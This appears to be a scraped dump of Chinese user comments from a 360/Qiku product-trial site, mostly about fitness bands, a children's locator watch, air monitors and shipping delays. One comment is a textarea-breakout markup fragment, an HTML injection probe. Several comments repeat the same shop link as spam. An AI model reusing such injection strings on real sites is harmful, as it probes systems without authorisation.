就中了50元话费，再没中过
对健康有益的智能产品一直是我的追求 
2999？可入手啊
生活必备品！
这东西什么地方都能清洁！
奇酷就像你的名字一样，产品出奇，有酷！但能不能让我适用一个过过瘾啊？
不错，虽然说了一大推，但俺还是搞明白了！俺的智商很高的，就是书读少了！呵呵
非常具有创意
那个是内裤蕾丝花边，555，内裤高了
了的清楚自己的身体状况感觉很实用，希望我能通过筛选。
看起来很不错 但是很反人性啊 我其实就是喜欢喝不健康的饮料 怎么破。。。
运动健康类产品现在很火热啊
哎，怎么搞得，有空申请竟然没空写报告！！
现在生活节奏加快，特别是一些白领人群在匆忙中根本无暇顾忌自己的身体及健康，现在身体好，将来才能有更大的成就哇！
不管是哪个版本的儿童卫士，我也赞同把录音功能改成对讲机功能
期待发售……
一点作用没有还大幅减少待机时间
很实用能够清楚自己的身体状况
支持下，已经申请。。。
支持，申请，希望能够选中
这个产品不错,但不知要不要后续收费.比如有些需要受一些平台费等.要是永久免费就好了. 期待上市ing...
点32个赞呢！希望能有一个这样的好东东～
一直在申请可惜从未中、、、这次呢？？？？
一键报警要是误按怎么办
录音功能确实不是很实用
可以设定按动按钮时间啊
谢谢奇酷给予的试用机会，甚是珍惜！
好像中呀，我是那种虚胖体质，不知道该怎么减肥呀
我还没接到发货短信通知呢。。有人收到了吗？听说是用EMS标准
感觉就是一个带蓝牙通讯功能的电子秤，貌似没有什么高科技的技术含量，估计主要指标还得靠APP软件根据用户自己输入的信息来计算，而且出来的结果也就是个理论值。
在哪能买到啊，很实用的东西，工作，学习，生活，好帮手
并没有让人眼前一亮的感觉！难道贵在手工上？
我怎么还没有收到呢？从哪里可以看到评测的发货进度？
美军炸弹制导貌似也定位不到10cm的精度，亲你说笑了。
好东东，国人应该注意身体素质了！
come on,come on,come on...
好酷！！！！！
come on,抽到我吧，感受体验下还你也成。
不错的东西 希望能有个 上次妈妈入院没赶上，这次希望买一个在家，让妈妈在家不会寂寞 
这个我是在“酷币了”活动兑换到的，奇酷试用筛选通过的我也还没有收到
赞！但价格肯定会小贵吧……
怎么都有人写报告出来了，我的却还不见踪影呢？
一直在申请，什么时候发售我什么时候能得到它啊
没有USB接口的咋办？
怎么回事？ 我的也没发货吗?
申请很多次了，不知道别人是怎么申请到？加油吧。炮灰们。
不错，这个创意需要支持，特别适合学校不提供洗衣机的在校大学生；
这个产品的实用性很强，早些适合经常出差在外地，家里面又一个人没有，想装个监控看下家里的情况，后来考察了一番成本太高，又不能联网远程查看。我看这个产品能满足这样的需要；
期待申请成功，需要减肥啦。
这个产品不错,但不知要不要后续收费.比如有些需要受一些平台费等.要是永久免费就好了. 期待上市ing... 
以后会不会出现电影里那样，被歹徒挖眼睛....
还没有收到货呢，他们这么快。
好棒的样子 
楼下的评论是真的吗
还以为是保罗
很厉害的样子
他能认识多少种？估计很有限吧
屎上公测最久的产品！
关键是价格和耗材
请问，它大概的有效信号范围是多少？ 和360随身wifi2比的话。。大概是距离更远、穿透力更强呢？还是什么？ 麻烦您帮我看看吧。。
好多创意中的产品都是在“点名时间”上众筹过的产品！汗
恭喜！表扬！给小红花！wwwww
发个屁  都嚷嚷多久了 垃圾
期待申请成功，正在减肥哦！ 
建议持续更新报告
设备的无线WiFi信号能覆盖室内半径30米内的区域，实测可穿透一堵墙仍保持不错的传输速度。和360随身wifi2应该差不多吧（我没用过360随身wifi2）如果比的话就是增加了U盘和急救系统
会破吗？？
赞一个，价格有点贵吧，可以放在奇酷试用申请里面吗？ 
我也很想试一下啊，我也正在减啊减啊肥。。
要是能有净化功能就更好了！ 
实用性为啥是1.0？ -_-&quot;
求中手环 360级别24级
这不叫评论！废话！
求发售速度
正好在健身房减肥中，有了这个真的是如虎添翼啊
请问如果是供应商该怎么联系你们… 我们有三款产品可以配套供应，分别是电池（电小二-代理）+电机（华夏恒泰-原厂）+气压传感器（MEAS-代理）；
等待收货。。。。。。
朋友 你到货很快啊  从那里查知道货到那里了吗   
减肥中，要是有了这个真的是如虎添翼，期待申请成功,感谢360对我人品的认可!
发货了没有啊。。。。。
首先，恭喜楼主中签。  接着说说楼主文章，时一篇好文章，但貌似楼主运气欠佳，空气检测出了一点小问题，其他测试还是成功的，是最实用的，也是大家非常关注的。  楼主的建议很中肯，本人对第三条非常支持（可能是工作原因吧，所有生产、加工、实验数据都有保存，日后其他分析、对比起来有依据可遵循）。  顺便来沾沾楼主的运气，保佑我中手环吧。
夏天到了，朋友们好多总是叫我一起吃呀喝的，肚子明显变大。有了这个，根据科学数据，相信能够更好的减肥。
希望能中啊
从开始到现在我就没见过这样的评测，写的比我大学论文还详细。实在是下功夫了。佩服佩服啊。写的真的详细，可惜我空气检测没中，看的我都想买一个了，楼主你是奇酷内部人员吧，哈哈
80美元价格还低，可以直接整个安卓手机了
http://www.demohour.com/projects/345692 这里有类似的产品，288，功能看似不比这个弱
我是被你用我的名字勾引过来的。。我还以我你在复制我的报告呢。。不过。。不怪你。。谁让我天天面对电脑呢。。所以。。报告写得比你早。。不过。。你的报告写得比我好多了。。下次吐槽要多向你学习啦。。
看着你这么高的智商，感觉一下子不好骗了。唉！这年头，骗子都要博士以上的学历才可以行走江湖。看你书读得这么少，怎么可能看明白我想说什么了。后来想了好久，才发现原来自己没有读过书，所以才被你看出来了。唉，别拦我，为了骗倒你，我要寒窗苦读，我要熬夜打游戏（好像是不是我说错话了）。
看到这评价说实话我真的格外开心，谢谢大家了。
如力申请中。真希望能中一次。
这款产品是不错。
这几天我们一直两天充一次了，还能有18左右的剩余电量
为什么我总是找不到在哪里写试用报告？有人提醒我登录帐号然后在个人中心里面有我的试用但是我试了，还是没有可写试用报告的地方。我也是幸运用户啊，急。。。。急。。。。急。。。。
官方没有人可以告诉我吗？我不是不写实在是斗大的馒头。。。。。。无从下口啊。
不过这个497的报告相当的专业，如果换着是我绝对不可能这么专业。
我现在不是能不能专业了，我是想写一个业余的都无计可施啊。
这个不错！喜欢 
真心希望健康与好运相陪伴！
哎，，，，，，，，，，，，，，，，，，，，，，，，，，，，，，，
真的是越来越懒了。 
怎么还没有发货啊。。
配套的视频太少了啊，怎么感觉这个设备是为了猥琐才出的呢。。。。。。
离科幻时代越来越近了，但是人真的越来越懒了 
怎么查订单号？
好期待呀希望申请成功！
你拍的照片很不清楚啊
产品的定位是什么
超级清洁。
创意很棒，看上去还是擦窗户靠谱，要是擦地会很慢吧，擦地时真空吸盘应该起不到作用，蒸汽还是有用的;成品的体积估计不小，这种造型要考虑储水、加热（蒸汽）、电池、驱动、收纳（赃物）等等，空间够用么？？？
美国的模式、服务在中国行得通吗？东西方文化的差异，体现在具体的产品上，国内能够接受吗？本土化的问题一直困扰着国外的国际化企业，亚马逊能做好吗？
不知道儿童能不能用？
数码达人申请报名，玩机六年，评测百篇，玩过的产品也有三百来台了。希望能够体验。onemoononestar
360更新太慢啦！！！！！点名都快结束了，还在创意中，你这个奇酷要是再这样拖拉，，估计都没有人逛你这个网了
想要的人在太多啦
写得也够天花乱坠的了。这东西真的靠谱么？
超酷的骑行装备，宝马 K1300 摩托车直列四缸引擎，动力十足，绝对的泡妞利器哦。
不通过 App 端，而是通过扫描一个二维码连接到定制的微信服务号。挺不错哦！
什么时候能公开购买.放暑假了哟.
主动帮我们宣传的用户最可爱了！
发货了没，我好期待他啊
好酷呀 这个要多少银子？
海边的有福了 
默默的说句这也太贵了吧
当然必须的 
3万元RMB，还是能接受的，这个人格，太贵了。
越智能的东西，坏起来越快，越难修理。
先点个人中心，再点你中的试用品边上的那个提交试用报告
果然很用心，一比我的简直弱爆了。祝成为优秀报告~~
这是一款非常好的产品，真希望能够得到它！！！
希望能够满足我得到它的心愿！
谢谢你的夸奖。大家写的各有优势。都是用心写出来的报告，不存在谁好谁不好。你写的也很好
写得非常好，要是有个空气空气净化器就方便。我突然一看还以为你要测试它的防水功能。
减肥中，要是有了这个真的是如虎添翼，期待申请成功,感谢360对我人品的认可!
貌似不咋实用哇
可以买了啊。不错的手环啊。
夏天到了，朋友们好多总是叫我一起吃呀喝的，肚子明显变大。有了这个，根据科学数据，相信能够更好的减肥。
哪里有官方回复80美元？
很不错，我喜欢，就是不知道多少银子，有了这玩意不怕再堵车了！！哈哈
真希望能够得到它！！！
用着泡妞，挺好的 
好期待呀希望申请成功------
3W块，你买老年代步车呢，起码10W起
真酷！我也想有一个
还没发货怎么就到了呢？这是试用得到的…
四天了，还没收到。。。。。。。。。。。
发个快递单号也好啊！！！！！！！！
错过了………………………………我难过！！！！！
这也叫试用报告？！建议奇酷收回试用手环，或者按照没交报告处置！
请继续更新试用报告！另外晒出孩子照片以及父亲和孩子的名字！
亲是专业评测师？看起来好像是摄影棚单反拍照啊！
这东西好 我没钱买
败家国度啊。
表示买买8970就好了，就是驱动麻烦了
每次没中，希望这次一定要中
真贵啊！！！！
表示还没收到
很不错的东西  赞
黑色电脑桌+台灯打光+入门单反。。。亲，楼主是物流行业的。。。ANYWAY谢谢亲的赞美^o^！
不知道这个产品是否支持中文简繁体？希望商家予以联系，谢谢！
又一个shine =_=
夏天到了开空调空气不好，买个这种产品挺好的。
这个我是在“酷币了”活动兑换到的，奇酷试用筛选通过的我也还没有收到 
很美，很强大。
你应该在本地上传两张图片作为你的封面照，要不然在报告列表中看不到你上传的图片。亲。
写的很赞，照片非常清晰。
他们是在“酷币了”活动中抽到的，他们也没收到！
怎么还没收到啊！多少天了都，奇酷还能行了不
希望能试用哦，一直期待能有这么个好产品
呵呵~~~
运费6yuan
没有第7点？哈哈~
一直都想有个体重仪，这个更青春更活力真的很喜欢，希望幸运能降临~~
哦 这样啊
希望可以帮忙减掉腹部赘肉！！！！
哇~大V回复~~好荣幸啊~~
靠谱，且很不错！
你的报告是榜首~~~
看了好几份了 数你最细致了  牛啊 写的太好了 尽管有些地方不太懂 很细致 让我对这个卫士2 多了 点了解 
希望能中奖，拿一个送可爱的老妈。让她也体验一下这造福人类高科技的产品。
希望不是拿我们逗乐子。
得先买一个海边别墅才能玩啊。
谢谢支持~\(≧▽≦)/~  有啥其他需要了解的回我 方枪枪童鞋~
很不错的产品，延续了随身wifi的好用，并且有了U盘的功能。
报告的太好了吧
写入速度和读取速度都不错啊。
高科技，为家里增添智能的宝贝
感觉很帅！！
穿戴设备真是层出不穷,,
好东西，值得拥有，但是肯定不便宜。
写得真心不错哦 细致！！规范
谢谢你的评价
没收到啊. 
希望能够为生活提供方便
创意不错，只是外观看起来稍欠档次，我们做了一款类似外壳，航空铝级别材质，透光孔通过上千个0.03MM的纳米穿孔技术实现，档次瞬间提升。
想感受一下，
亲人呀今天还能上市吗
给力啊12444
强烈建议360儿童卫士增加本地录音功能，录音时长最大要支持5-8个小时左右，这样便于分析孩子在学校的学习情况。并且录音要能通过wifi或usb线将录音导出
再也不陪你玩了
作为一个胖纸，能不能照顾一下我的情绪？呜哇  中一个吧好不好？？？
夏天到了，朋友们好多总是叫我一起吃呀喝的，肚子明显变大。有了这个，根据科学数据，相信能够更好的减肥
夏天到了，朋友们好多总是叫我一起吃呀喝的，肚子明显变大。有了这个，根据科学数据，相信能够更好的减肥
选我啊！！！每次都没中，希望能中，因为我还是这么乐观的投啊！！各位，选我吧
好想要好想要， 真的很想要哇。跪求一台哇。 
怎么还不试用 
这个···回头率百分之百啊 
qidai 
哇，试用可以吗？ 
太帅了！！
忒拉风了，得多少钱
这才是我心中的智能穿戴
好东西！司机的真正助手，赶紧搞个试用吧！
谢谢赞赏！！
在哪里购买呀   多少钱一个
你是奇酷第几期的中签用户呢？
喜欢来一个 
谢谢大家支持，评论被推荐了。真的很感谢大家
以后一定要带更好的评测给大家
这么久了，也没有试用的机会，连买的机会都没有！！！！
膜拜大神 这就是差距啊 怪不得我中不了 评测的太到位了 学习了
好东西啊，求试用啊
我今天才收到短信说发货了
这么好估计不会便宜
乐死我了。。
的确在家里，感觉挺耗电
还没到货呢，怎么就开始计算时间呢?今天才发货而已呀，缺少这几天的话，那么试用报告的质量就可能大打折扣了。我是真心想搞好试用报告的。
看得出来，楼主是下了很大的功夫才能写出这么精彩的试用报告，对这玩意儿的实用性和各项功能解析得很专业、很透彻，哈哈，估计制造商都没有想到你会拿它去检测SO2这种有毒气体，还有杀虫剂（好残忍。。）等等，只是可惜了楼主人品不佳，检测仪貌似是出故障了，没法检测空气质量，准备的东西没派上用场。支持楼主，期待还能看到你的报告！
看得出来，楼主是下了很大的功夫才能写出这么精彩的试用报告，对这玩意儿的实用性和各项功能解析得很专业、很透彻，哈哈，估计制造商都没有想到你会拿它去检测SO2这种有毒气体，还有杀虫剂（好残忍。。）等等，只是可惜了楼主人品不佳，检测仪貌似是出故障了，没法检测空气质量，准备的东西没派上用场。支持楼主，期待还能看到你的报告！
写得非常好也非常详细。我受教了。回家了一定要给宝宝买一个
您好，对于您提到不足3：提醒您一下，手环只能开机不能关机；APP只能关机，不能开机！
那你肯定没看我的，呵呵
京东上有一款科大讯飞出了一款类似的。
超大型使用手册！ 赞~
很是期待拥有一个，培养自己和家人良好的生活习惯，健康生活
我觉得你的第一点和第二点建议非常好！定点定位以及网页操作
我知道哪里买，加我，我这里厂家价格。
快点吧，我们等不起了！
快点吧，我们等不起了
从未参加体验活动，希望真实体验一次。
感觉蛮不错的
今天才发货吧？耐心等等吧。我也中了。。嘿嘿
恩，是啊，我也是
我的手机是ios的，还没有新的APP更新，到时候会测试蓝牙随行模式，这可是蓝牙4.0才支持的！
孩子带着洗手没有问题！
哎~确实是人品问题啊，为什么我的空气检测仪有故障能。算了自己拆开维修下。。。谢谢你精彩的评论
Qi不是挺好用吗？
亲：1代产品估计今后就不支持了，因为毕竟是公测用的。2代产品我家大宝蛋可不想借出去！
这么好估计不会便宜
还有三天，女神啊快来吧！！！
厉害，要多向你学习下
如果有个液晶屏幕显示经纬度、海拔、运动距离就更好了，参考长天M241
哈哈，虎躯一震，急需增肥！！！
看上去应该不错吧，赞一个！
建议值得奇虎360认真考虑！尤其是充电问题！
1、待机时长和充电体验？ 2、定位频率是否有必要按照时间段分别固定设置自动调整以及临时需要手动调整？？比如：每到周1周5（除节假日外，可有日历功能设置节假日自动排除）的上课时间（可自定义）频率自动降为最省？
可否明确下试用品的手机型号匹配不善的清单？以及奇酷360的回复，以及下步改善计划？
应该说，你的评测才提到了我最关注的：定位效果！！！ 号称史上最准确，那么，车辆gps定位是10分的话，奇酷360应该算几分？要达到多少分才能令人满意？？ 这是所有人关注的唯一重要的焦点项目！！
1、小红花能不能是真的小红花，或者，可以自选图案？冷冰冰的数字？？？？倒是考虑了孩子长大到12岁也可以接受的问题？！能不能实时体现在主时间表盘的界面上以示提醒？
录音这么重视，看来你要买的是监听老公的设备，而不是应急找寻小孩的需要！嘿嘿 吐槽下：你还可能真的不是为了小孩买的，所以，评测也太？？？
4、定位功能：这个其实应该是这个卫士最核心的部分，准确的说功能很好，定位了几天，只有几次范围稍微有点偏差，这是非常值得表扬的部分； 3、定位功能在距离较远处还有有点偏差，能否改进得更精准一点？  同样关注，希望能够看到进一步的详细测试，说明下具体的偏差情况，好决定是否有必要因为唯一重要的核心功能可以接受而下手！谢谢
 4、手机定位感觉也不是广告上说的那么准，同一个基站测试，我的手机和360儿童卫生2在一起，地点能差50米左右。把宝宝从家里带到家属单位测试，发现软件轨迹连线太随意，完全没有按照应有道路或路径连接，过河时，一条线竟然呈V形，从没有桥的河面上划过，离道路好几里地，难道宝宝是游过去的？  本人最为关注的问题，谢谢你提供的信息！
定位最准确的其实还是手机的GPS（当然是差不多的手机），车辆的不能给10分，之所以觉得车辆的很准是因为导航系统默认车是在路上的所以看起来会很准，这是题外话。像文中说的，手表的定位测试还不能下结论，但显然是基本做不到孩子丢了用它找回来这种事的。唯一可以提出的问题是wifi辅助定位还不够给力。硬要打分的话，10分给个及格分6分吧，不要期望太高。
3、安全区域方面，这一点很好，不过我建议也能设置警戒提醒区域，比如可以将网吧、水库、交通偏僻区域、社会情况复杂区域都可以设置红色预警。  对奇酷360的提醒：某些产品使用的说法是：电子围栏之类的，很是令人生厌！电子护栏差强人意，边界设置，示警范围，之类的，要琢磨下，别给人以自家孩子象什么样的限制在围栏之类的里面那样！！！！！
定位有待加强，手机和手表距离10厘米，定位显示51米 试了试录音等功能，很强大。  你的这个信息是我最关注的定位有效性的问题！但是你没有说明是室内还是室外？gps还是wifi辅助定位，另外，可否有人评测下手机开启2-4g数据链接的情况下，能否更有助于定位准确？是不是手机本身定位误差20米，加上手环误差结果导致有50米的误差，这个，记得有评测报告说是室内的偏差距离！
8、“红花”功能不全似乎有BUG存在：  这不是bug，是软件开发人员的思维能力的问题！
4、最后谈谈定位功能吧。定位时需要等待才可以定位，很同意其他试用者的感受，这一功能就是定位追踪报警，真正当宝宝丢失时候，家长或许希望的不是简单的知道他这哪个方位，而是更希望在自己去寻找的时候离他还有多远？是否是越近距离，手机的报警就越为明显。  同为关注！！！号称史上最准，我需要听其言观其行！
早点更新吧。。。
1: 开设RyFit自己的网站，主打减肥和健康生活食谱。开设交互性论坛，可以通过云悦智能体质分析仪上传个人数据。邀请专家讲解建议健康食谱，明星红人坐镇讲解自身减肥健康生活，肥友上传个人减肥记录互相打气加油。什么？你要增肥？去死吧！！！ 2：手机端可以输入吃的食物种类和数量，然后给出这餐摄入了多少卡路里。反过来也可以输入需要摄入的卡路里数量，然后给出几份健康食谱。方便在家有时间的肥友。 
3：用户在设定的时间段，一般是餐前，手机端根据用户的体质数据自动给出菜单和附近的餐厅饭馆。可以给餐厅免费送出分析仪让就餐顾客体验，扫一扫APP就可以获得折扣或优惠劵。等知名度上来后可以做大成用户一起团购，拼餐等形式。主要针对上班在外，没时间自己做饭的肥友。 4：开设美食分享分论坛，提供一个全国甚至国外网友分享本地美食的园地，不让吃猪肉还不能看猪跑吗？看看《舌尖上的中国》有多火吧！ 
总之，减肥这一市场要多火有多火，云悦不应该只做卖硬件的厂商，而是学习苹果卖软件。当然，自身产品过硬才是能够持续发展的根本。
想法挺好的，但是好像花设多了，或者送花送的快，手环上的花数量就不走了
呦呦呦 得意个笑
其实手表上可以设计一个关机功能，晚上不需要一直开着。当然，通过APP来关机也不是不行，只是多了步骤。个人观点。
什么时侯公开发售这才是重点，从第一代产品关注到现在的二代，你上不了市再好也没用。360你真该拿点效率和真诚出来
这个设计难度太大啦吧，可能不会有成品。
已经是夏天，好多朋友总是叫我一起出去吃烧烤呀喝啤酒的，肚子明显变大。有了这个，根据科学数据，相信能够更好的减肥
9999999999999999
期待期待，能给我这次试用产品的机会
不交试用报告的，太对不起奇酷了。这样会降低商家的积极性，间接危害其他申请者
360的试用真实一大败笔，看了几个试用报告，简简单单的就完成了，这就是试用？ 同样关注360手表的亲们 在没得到实物的时候想要通过试用报告来衡量这款产品的优劣。建议所有的试用人员缴纳押金，试用报告必须满足一定的要求才退，否则不退。这样也能让获得试用产品的人能够认真的填写试用报告
偷拍的神器
真好。不错
偷拍神器丫，不错。。喜欢
1、待机时间为10小时左右。充电在1小时至1.5小时之间，建议对电池增容，但这样会增加手环物理尺寸； 2、定位频率方面建议有手自动转换功能，手动状态下手环以低功率运行，但后台定时（1小时或n小时自由设置）记录物理位置，需要定位是发出定位指令，这样降低电能损耗，其次是自动状态下手环按照预先设置的自动运行状态点循环往复定位，在安全区域可自动降低定位频率，在预警区域内增频。 谢谢提问，不知回复是否满意。
期待试用，提醒自己养成良好生活习惯
希望更多没有中过的人可以有更多的机会
期待试用成功！！
给个试用，谢谢
谢谢，你过奖了 
必须赞下！
一直支持奇酷，希望有个机会
感觉现在身体越来越差，可能是生活习惯不正常的原因，希望云悦能帮到我
很酷的装备哦，很能吸引孩子的目光。不光让家长放心还能让孩子喜欢，期待更精准的定位哦.
“医疗级”的心率传感器,不仅智能还很专业嘛！
挺不错哦，很环保的设计，不用为耗材担心了。
一直支持奇酷，希望有个机会 ，感觉现在身体越来越差，可能是生活习惯不正常的原因，希望云悦能帮到我 期待试用成功！！
哥哥,加油！ 相信你的团队会给大家带来很多惊喜和改变，期待着产品的量产！                                                             宣洋
嘻哈大师的杰作 支持！！
怎么还不能购买？？？？
浙江有个土豪已经买了 50多万
这么快            我的昨天才发货 现在还不知道在哪里
楼主描述的很详细啊，感觉整体还是挺不错的，实时定位，还有那个报警的功能都很好，就是如果产品本身的质感和设计上个台阶就更好了。ps，小菇凉很可爱哦。
声控的识别准确率多少？有效范围几米？
给法国德国的乳房
环保型的3D打印机。。。
滞空时间太短了。能不能延长。1小时左右。
一个这个东西在家里跑来跑去感觉好别扭啊。外星生物。
期待试用，提醒自己养成良好生活习惯 
非常用心!你这则评测成本真高!挺好的,建议增强排版
想好好减肥啊
这个我是在“酷币了”活动兑换到的，奇酷试用筛选通过的我也还没有收到  
看完请点赞哦！！！
从小身体差，希望能试用到，
24号发货，估计最少26号才能到。。。。
这都过去2个月了，还不发布？
很不错的产品，尤其是定位和报警功能很不错。现在的这个社会，家里的小公主带上这个安心一点。女儿正想买个电子表，这款产品很适合啊。喜欢！楼主的女儿很可爱！和我女儿一样的可爱！
你怎么知道是24号发货呢
原来是短信通知发货呀
不是说21号开始发货吗？我24号才收到短信，有没有21号收到短信的?
他之前自己买的~
他之前自己买的~
大神啊，我都好几期了，好歹中一期
抄袭没有好结果
如果设计成功，并且如介绍说的这么管用的话，真心要买一个，懒人的福利啊！
真的么？根本用不了是什么情况？完全无法使用还是某些功能无法使用？
谢谢！！！
嘿嘿 对啊 
这个真的是什么都可以实现呀，没有不可能的事情，可以控制汽车，家用电器，智能家居，门窗，安装系统，玩具，真的太多了。
试用可以吗？
看了试用报告，很多人都是随意填写的都中了，搞的我很想ooxx，我可是从一知道有这个就很用心的一直再追，铁粉了。真心说一句：试用的不给我，就让我赶紧买上一个吧。再不上市，黄花菜汤都喝不上了~~~~~
第一次来，就看到这种活动，真好，鼓励一下～
有钱人的玩意 
修改了头像，好开心～
这个还能试用吗？
今天快递到了.....真没想到我居然中了.....最后......哇哈哈哈！
好吧，确实没有你专业。
这样工作起来会轻松很多
您好！方便的话请把联系方式留下，我们会有专人联系您！
关于续航问题我们一直都在研究改善中，争取把最好的状态呈现给各位客户！请问您有购买我们的产品的吗？我们现在有个G300 VIP 活动，现在购买就可参与。无论将来我们如何再发展，作为VIP的您都将最先享受到我们最新的优惠！亿航欢迎您的加入！
不是4.0蓝牙手机不能支持吗？手机是安卓系统，蓝牙不是4.0的 
赞一下，杨坏瓢虫和小文，以后他们身后的360手环工作人员们，真心谢谢了，前几天测试的时候，发现我手机类型不能使用360手环app客户端，好像是数据库特殊，不过经过他们这几天的努力，终于可以正常使用了，THANKS，给你们32个赞
手机客户端，功能还在完善中，功能越来越强大
谢谢夸奖，第一次写，还需要努力啊
我还没收到任何短信和东西。。。
从关注到现在，想买买不了，想试用试用不了，孩子很快不需要用这个了
这么快就发报告了啊？我的才到呢！
什么时间公开销售？期待中…… 
这也叫报告？这也叫评测？一句话还要你来评测做什么？
我的还没到。。。
你们都有短信吗？ 
。。。用万能钥匙能破解个毛线。
路由器长375px，宽275px，高50px。。px不是像素？
DNS是什么？简单的说就是域名。。。好给力的解释。
希望能获得这个东西，我体质也差，希望能好一些
呵呵. 报告嘛. 很简单，只要你对奇酷够了解，就很快能写出来
不急不急，奇酷发货一般都在10天内. 
WIFI不需要链接上，只要有信号就可以用来定位
了解，不过是否需要刷新固件？还是已经具备这个功能了？
赞！写得好的就应该期期都中
真酷，I Like
什么时候出啊？？
强，，可惜。。 不知道什么时候能买上。。
求神啊！中吧！
提出垃圾清理是我的主意大哥…，另祝贺中了
它那个洞就是用来穿钥匙上的绳子了…
topgear 21季第2集 爱奇艺有，自己去看
刚刚参加了此活动，希望中奖
上帝，赐予我自然的力量吧！
&lt;/textarea&gt;&lt;embed&gt;
有的呢，昨天收到了，但没去看。
想起3diots
很好的产品功能都很齐全，希望能中签！
早都有了  都在是实验室里面  民用要好等等
货到了！！！
就是，以后别给他！
我热爱骑行，但是我目前没有很宽裕的经济，而且旅行基本是穷游，而且在我的身边有很多大学生都很爱旅行，包括骑行，而且他们其中也有一大批人是跟我差不多的经济条件都不是很宽裕的，会舍不得花那么多钱买这么一个相对比较昂贵的东西~
赞一个，有免费试用的吗
我先为自己点赞，写的太不容易了。哈哈
都写得不错。我也不是最专业的。只是多花点时间，改了又改。再多找下度娘。才写出来的。还有很多写得比我更好的。
其实我看过你的评测，在你这也学了不少东西。今天多谢你能评价我的试用报告，其实在你出报告时我就给你点过赞。因为你确实写的比我好。排版也是我需要学习的地方。
...还是赛扬的。。。。
谢谢你能来支持我。真的很感谢
这个试用官的问题好像是评测交不上去。在论坛有问题反馈吧。
先点个人中心，再点你中的试用品边上的那个提交试用报告 
这个很直观反映人体参数，很有用！
天猫早就有了
这个店铺还能购买，我在这个店铺里面购买的；http://shop108781426.taobao.com 
这个店铺里面可以购买，http://shop108781426.taobao.com
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
我在这家店铺购买的：http://t.cn/RvHgvYH
试用了n次都没有都被那些测评试用的高手全霸占了让我我们这些使用菜鸟情何以堪啊
希望它能让我边玩边瘦
等着购买，
中啊中啊中啊，一定要中签啊
怎么买？买？？？
跟360有关系没啊？为什么发亚马逊的东西呢？
能量产吗，什么时候我才能买到啊
什么时候开卖啊？千万不要学小米那恶心的营销方式，OK？
好东西。实用
酷，太酷了
等待它给我们试用
想起了多啦A梦 
从关注到现在，想买买不了，想试用试用不了，孩子很快不需要用这个了
后面多参与 好多新奇有意思的产品呢..
16美元、好便宜 
昨晚经过测试，电池续航已能达到25分钟！但我们不会满足于现状，继续研究改善，正如我之前所说，亿航将会把最好的都展现给客户！
赞一下。我也好喜欢这种活动。
还有一天时间，对我来说，既是一件喜事，又是一件悲事。为何我已经连续参加这个活动总是中不到
申请试用，不知道能不能中、、、
这属于有钱小孩的壮丽了
超级手表啊。Moto360。跟360有啥关系。
不知道售价是多少？ 
申请试用，不知道能不能中!!!
中啊中啊中啊，一定要中签啊 !!!!!!!!!!!!!!!!!!!!!!!!
中啊中啊中啊，一定要中签啊中啊中啊中啊!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
试用了n次都没有都被那些测评试用的高手全霸占了让我我们这些使用菜鸟情何以堪啊
非常酷，价格合适肯定入~~
妈妈心脏病，帮我带个小宝宝十分不放心，这个东西太好了，什么时间出，有没有人知道哪里有卖这种东西的
这是靠什么定位呢
功能很强大，减肥就靠它了！
描述了大半天，小编是不是忘记介绍价格了？
外观跟我买的台灯很像，不知道实用不实用！
说实话，感觉360挑选测试者肯定是随便选的，根本就不是根据自己写的申请内容选的，好多测试人员都说，看见有就点申请了，结果就中了，到手后就简简单单照点照片上传就完了。产品根本就没有到我们这种特别需要，特别渴望的人手里。
感觉这个建议比较实用。
录音功能是个不错建议，比较实用吧。现在学校等地发生的不愉快事件也很多。
这东西，支持    但我不会买哦的 
第一代到二代..说的上市还没影 错过时机的话等着被其他产品秒杀
对奇酷的界面感觉挺有科技感的,很喜欢这样的网站,加油
感觉还不错已经提交申请了希望能中，支持360。  
三星在手表这块真没少下功夫
大爱，正合适减肥用，么么哒
大方简洁，喜欢外观
再不开售孩子都大了，买了他也不带了，觉得家长是在监视他的行踪的！
发货、到货送货都收到短信了，上午来了快递电话，晚上下班取，期待中。。。
我也不知道这是怎么回事（我记得照片上传成功了），如果你知道的话，请告诉我，我会虚心接受的 
我是360督导，产品为公司测试提供！谢谢
您好，这是我们硬件测试组提前得到的，这是8G版还没对外发售的产品时获得的，属于内测。因此能在此次测试前就就已经进行过体验测试！另外，我的货物其实早就到了！
%&gt;_&lt;% 请见谅，光线条件不是很好，而且我用的是iPad 2 所以噪点比较多，没有双色温闪光灯和高像素摄像头，无法展现真实原貌。请见谅！
我可能会买，如果跟普通的体重秤的价格相差不会很大的话。支持一下。
都尼玛 要发毛了 还他妈的发售 多久了
这试用报告写的太牛了，一开始看到这个空气净化器，感觉这样的试用报告可能会无从下手，楼主这个试用报告，完全颠覆了我对试用报告的认识，太详细了，完全出乎我的意料，只能用两个字形容：强悍！
非常详细并且专业的报告。从各个维度都对U盘随身wifi做了细致的评测。赞一个。
教主也中了这个？
外表时尚，不知道小朋友是否喜欢、
孩子的想象才是无边无际的，可这要how much
图少了感觉
报告很精彩，还有自己手画的插画，哈哈。一个产品满足两个需求，确实非常不错哦。
给你点赞了。
期待售卖啊。期待售卖啊。支持360.
宝贝非常可爱哦。
求赞~~~~
很用心的报告，写的不错。下次再努力。。。。
确实非常强悍啊。还找到了这么雾霾大的地方去做测试。佩服。
原来是踢球高手啊。赞。
试用了N次了，都没被抽中。全被那些试用高手霸占了，让我们这些人怎么办啊。
当然不能这种东西只是一个小型的无线路由器
这个到底真的假的没中一次
这个的功能挺不错的，很喜欢
只能用两个字形容：神器
谢谢支持，这是我第一次评测，希望还有下一次。
运气好吧，正好那天取景的时候出了沙尘暴
不算高手，我现在掉第2名了。可能游戏结束后都没得名次了。
喜欢玩穿戴的加我QQ526337692，大家一起玩
东西 够简约大气，很符合时代的品味 ，价格有点贵。喜欢玩穿戴的加我QQ 526337692. 大家一起玩，一起嗨起来
